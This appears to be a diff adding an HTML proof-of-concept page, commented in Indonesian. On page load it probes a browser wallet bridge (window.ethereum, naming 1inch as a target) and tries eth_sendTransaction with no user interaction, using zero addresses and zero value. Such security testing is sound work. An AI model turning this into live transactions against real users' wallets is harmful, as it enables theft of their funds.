@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Security PoC: JS Bridge Exposure</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
+        #log { background: #f4f4f4; padding: 15px; border: 1px solid #ccc; border-radius: 5px; height: 300px; overflow-y: scroll; font-family: monospace; }
+        .success { color: green; font-weight: bold; }
+        .error { color: red; }
+    </style>
+</head>
+<body>
+    <h2>Security Test: Unrestricted JS Bridge</h2>
+    <p>Status: <span id="status">Menunggu...</span></p>
+    <div id="log"></div>
+
+    <script>
+        const logBox = document.getElementById('log');
+        function log(msg, type = '') {
+            const div = document.createElement('div');
+            div.className = type;
+            div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logBox.appendChild(div);
+            logBox.scrollTop = logBox.scrollHeight;
+        }
+
+        async function exploitBridge() {
+            log("Memulai deteksi bridge...");
+            
+            // Ganti 'ethereum' dengan namespace objek spesifik milik 1inch jika ada
+            // Contoh: window.ethereum, window.inch, window.wallet, dll
+            const bridge = window.ethereum; 
+
+            if (!bridge) {
+                log("[-] Bridge tidak ditemukan. Mencoba namespace lain...", "error");
+                return;
+            }
+
+            log("[+] Bridge ditemukan! Nama objek: " + Object.keys(bridge));
+
+            try {
+                log("Mencoba memanggil fungsi transaksi tanpa interaksi...");
+                
+                // Payload transaksi (Gunakan alamat dummy untuk pengujian aman)
+                const txParams = {
+                    from: '0x0000000000000000000000000000000000000000',
+                    to: '0x0000000000000000000000000000000000000000',
+                    value: '0x00',
+                    data: '0x'
+                };
+
+                // Memanggil fungsi transaksi
+                const result = await bridge.request({
+                    method: 'eth_sendTransaction',
+                    params: [txParams]
+                });
+
+                log("[!] SUKSES: Fungsi berhasil dipanggil!", "success");
+                log("Hasil: " + JSON.stringify(result));
+            } catch (err) {
+                log("[-] Eksploitasi diblokir atau terjadi error: " + err.message, "error");
+            }
+        }
+
+        // Jalankan otomatis saat halaman dimuat
+        window.onload = () => {
+            document.getElementById('status').textContent = "Berjalan...";
+            exploitBridge();
+        };
+    </script>
+</body>
+</html>
